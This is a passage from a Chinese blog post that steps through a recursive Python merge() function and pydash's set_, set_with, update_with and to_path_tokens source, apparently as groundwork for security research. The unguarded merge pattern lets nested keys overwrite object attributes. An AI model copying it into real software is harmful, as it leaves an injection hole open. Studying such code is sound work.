class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>​首先说一下我的知识盲区，算是因为这个，我才看不懂这个函数的源码的吧。</p><p>​首先是字典的 items 方法， python 中的 items 是可以将字典中的所有项，以列表方式返回。大概情况如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.items())</span><br><span class="line"></span><br><span class="line"><span class="comment">#dict_items([(&#x27;a&#x27;, &#x27;1&#x27;), (&#x27;b&#x27;, &#x27;2&#x27;), (&#x27;c&#x27;, &#x27;123&#x27;)])</span></span><br></pre></td></tr></table></figure><p>​其次就是 hasattr () 函数： <code>hasattr()</code>  是一个内置函数，用于检查对象是否具有给定的属性。这个函数接收两个参数：第一个参数是要检查的对象，第二个参数是要查找的属性名称。如果对象具有该属性，则  <code>hasattr()</code>  函数返回  <code>True</code> ，否则返回  <code>False</code> 。大概情况如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(a,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>​之后是 <code>__getitem__</code> 属性：在 Python 中， <code>__getitem__</code>  是一个特殊方法，用于定义对象的索引访问行为。它使得对象可以使用方括号  <code>[]</code>  进行<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEQlRTQlQkQlOUMmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">索引操作</span>，类似于列表、元组和字典等内置容器类型。</p><p><strong>大致上，可以通过这个属性是否存在来判断某个对象是否为字典，不过不能准确确定下来。</strong></p><p>​再之后是字典的 get 方法，这个是获取字典中指定键的值，具体不做演示。</p><p>​最后：setattr () 函数的功能相对比较复杂，它最基础的功能是<strong>修改类实例对象中的属性值</strong>。其次，它还可以实现<strong>为实例对象动态添加属性或者方法</strong>。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;321&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#123</span></span><br><span class="line"><span class="comment">#321</span></span><br></pre></td></tr></table></figure><p>​好了，用下面这个做下测试，在函数里下一个断定，来调试看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">c = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">merge(a,c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>​最开始的时候，k，v 分别获取了 a 和 1 这两个字符，然后继续向后执行，当函数执行到 <code>if hasattr(dst, '__getitem__'):</code>  的时候，如果发现有 <code>__getitem__</code> 属性，则大致判断这个是个字典，执行下一步，如果没有，则判断目标字典里是否存在 a 这一个属性，以及是否为字典，如果是字典，则递归调用，如果不是字典，则执行 else 里面的语句，设置一个全新的属性在后面。在这里因为目标字典只有 c 字段，但是源对象是一个字典，所以会进入 if，进而设置一个新的属性，也就是成功加进去了。</p><p>​ <code>if dst.get(k) and type(v) == dict:</code>  这一行，检查目标字典的 k 键，也就是第一次进入时迭代获取到的 a 属性，目标是确认 a 属性是否有值，同时判断 k 是否为字典，如果 k 是字典，就递归执行。</p><p><strong>大概就是这样的，可能不算很详细吧，这个只有自己打断点调试才能看出来吧。</strong><br>​</p><h2 id="2-pydash的set_函数源码信息"><a class="markdownIt-Anchor" href="#2-pydash的set_函数源码信息">#</a> 2、pydash 的 set_函数源码信息：</h2><p>​无可奈何之下， 这里选择先审以下 set_的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string">    设置由“path”描述的对象的值。如果对象路径的任何部分不存在，它将被创建。（这里稍微有点类似于flask的ssti里面找链子的方式。）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure><p>​可以发现，这个函数底层是使用的 set_with 函数，同时，这个函数会将第一个参数作为模板，将第二个参数通过点构成的类似链子的东西递归成一个对象，这种对象类似于第一个参数的类型，比如第一个参数传入的是一个字典，那么久递归成字典的形式，和它举的例子相似，这里久不进行操作了。</p><p>​然后接下来就是 set_with 函数了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string">    这个方法类似于：func:`set_`，除了它接受定制器，调用customizer生成路径的对象。如果customizer返回未定义的路径，则由该方法处理路径创建</span></span><br><span class="line"><span class="string">相反。使用三个参数调用customizer：`（nested_value、key、nested_object）``</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>​这个函数底层调用了 update_with 函数，跟进看看，这个函数不是很能搞懂 customizer 这个参数的作业。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        这个方法类似于：func:`update`，除了它接受定制器，调用定制器生成</span></span><br><span class="line"><span class="string">路径的对象。如果定制器返回“None”，则路径创建由以下方法处理</span></span><br><span class="line"><span class="string">相反。使用三个参数调用定制器：“（nested_value，key，nested_object）”。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    <span class="comment">#使用 to_path_tokens(path) 将 path 转换为路径标记的列表。</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#如果解析结果不是列表，则将其转换为单元素列表。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>​这里先放着这个源码，先读一下 <code>to_path_tokens</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#由于我们无法判断一个空数应该是字典键还是列表索引，我们</span></span><br><span class="line"><span class="comment">#支持一种特殊语法，其中任何被括号括起来的字符串整数都被视为</span></span><br><span class="line"><span class="comment">#列表索引并转换为整数。</span></span><br><span class="line">        keys = [ <span class="comment">#使用正则表达式 RE_PATH_KEY_DELIM来分割字符串。分割后，对于每个部分（key），会进一步检查：</span></span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="comment">#如果 key 匹配 RE_PATH_LIST_INDEX，则将该部分视为列表索引，并创建一个 PathToken 对象，其键为转换后的整数索引，默认值生成器为 list。</span></span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#如果 key 不匹配 RE_PATH_LIST_INDEX，则将其视为字典键，并通过 unescape_path_key（未在代码段中定义，但我们可以假设它用于处理可能的转义字符）函数处理后，创建一个 PathToken 对象，其键为处理后的字符串，默认值生成器为 dict。</span></span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="comment">#如果 value 是 UNSET则返回一个空的 PathToken 列表。</span></span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="comment">#如果 value 不是上述任何一种情况（即它可能已经是一个列表或类似结构），则直接返回 value（尽管这里可能存在一个类型不匹配的问题，因为通常我们期望返回的是 PathToken 对象的列表，而不是原始值）。然而，基于函数的命名和描述，这可能是一个错误或特殊情况的处理方式。</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure><p>​这里比较重要，分析一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#遍历path并更新对象</span></span><br><span class="line"><span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):<span class="comment">#这行代码使用enumerate函数遍历tokens列表，但通过pyd.initial函数来获取除了最后一个元素之外的所有元素。这意味着遍历将跳过tokens列表的最后一个元素。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这里检查当前遍历到的token是否是PathToken类的实例。如果是，则从token中提取key值，并尝试从tokens中获取下一个元素的default_factory。如果不存在，则使用default_type作为默认值。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">        key = token.key</span><br><span class="line">        default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#如果token不是PathToken类的实例，则直接将token作为key，并将default_factory设置为default_type。</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = token</span><br><span class="line">        default_factory = default_type</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#使用base_get函数尝试从target对象中获取key对应的值，如果没有找到则默认为None。同时，将path_obj初始化为None。</span></span><br><span class="line">    obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#如果call_customizer为真（假设是一个函数），则调用该函数，并传入当前值obj_val、键key和目标对象target，结果赋值给path_obj。</span></span><br><span class="line">    <span class="keyword">if</span> call_customizer:</span><br><span class="line">        path_obj = call_customizer(obj_val, key, target)</span><br><span class="line">        </span><br><span class="line"><span 